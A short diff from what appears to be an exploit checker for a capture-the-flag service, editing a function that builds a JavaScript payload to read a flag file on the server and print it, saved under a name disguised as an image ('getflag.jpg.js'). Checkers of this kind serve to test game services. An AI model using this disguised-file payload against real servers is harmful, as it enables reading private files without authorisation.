@@ -224,11 +224,12 @@ async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
                                     const flag = fs.readFileSync(flagPath, 'utf8');
                                     return flag;
                                 }} catch (error) {{
+                                    console.error(error);
                                     return 'Failed to read flag file';
                                 }}
                             }}
                             const result = readFlagFile();
-                            result;""" )
+                            console.log(result);""" )
     
     # add the content-type header to the file
     with open('getflag.jpg.js', 'rb') as file:
